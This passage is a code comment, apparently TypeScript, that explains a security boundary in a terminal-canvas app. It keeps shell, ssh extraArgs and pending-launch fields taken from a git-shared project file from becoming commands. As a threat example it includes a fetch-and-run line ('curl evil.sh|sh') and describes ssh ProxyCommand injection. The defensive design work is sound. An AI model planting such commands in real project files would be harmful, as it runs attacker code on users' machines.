/**
 * Trust boundary for the node fields that end up EXECUTING something.
 *
 * `.nodeterm/project.json` is hostile input: it is git-shared, hand-editable, auto-adopted by
 * "Open folder…", and for an SSH project it lives on the remote host. A value that arrives from
 * that file was never typed by the local user, so it must never become a command. The codebase
 * already honors this for `initialCommand` (deliberately never serialized); two siblings reach an
 * exec the same way and are handled here:
 *
 *  - `NodeState.shell` — the session program. It lands as tmux `new-session`'s trailing command
 *    argument, and tmux runs a lone command argument THROUGH A SHELL. A cloned repo could ship
 *    `"shell": "curl evil.sh|sh"`, or simply point at a script committed in the repo.
 *  - `NodeState.ssh.extraArgs` — spliced verbatim into the `ssh` argv (`buildSshArgs`), where
 *    `-o ProxyCommand=<cmd>` makes ssh run `<cmd>` LOCALLY through /bin/sh.
 *  - `CanvasNodeState.pendingLaunch` — a held launch. Its `command` is TYPED into the node's shell
 *    once the canvas says the wait is over (`launchesToFire`), and `after: []` or a dep that no
 *    longer exists counts as satisfied. So a project file or a wire frame carrying one is a command
 *    that runs as soon as the canvas is viewed. It is produced only by this machine's own
 *    orchestration (`--after`, a cold open, a worktree setup gate), so it is machine-local exactly
 *    like `shell`: never written to a shared file, never accepted from a peer, and round-tripped
 *    through the machine-local index so an armed node still fires after an app restart.
 *
 * Both are legitimate when the LOCAL user sets them, so they are not deleted — they are made
 * MACHINE-LOCAL: `stripSharedNodeExec` keeps them out of every project file we write, and
 * `localNodeExec` / `applyLocalNodeExec` round-trip them through the machine-local workspace.json
 * index instead (`IndexEntryV3.localExec`). A project file therefore contributes NOTHING to either
 * field: the safe fallback (default shell / no extra ssh args) is what an unrecognized or foreign
 * value degrades to.
 *
 * `safeSessionProgram` is the second layer, applied where the value BECOMES a command (pty-manager),
 * in the same idiom as `permissionModeFlag` re-validating at the interpolation site: whatever the
 * path a value took to get there (a peer canvas mutation, a stale in-memory node, a future caller),
 * a program string carrying shell metacharacters is never handed to tmux.

 * The caller runs this exactly once per entry (`IndexEntryV3.execMigrated`), so a project file
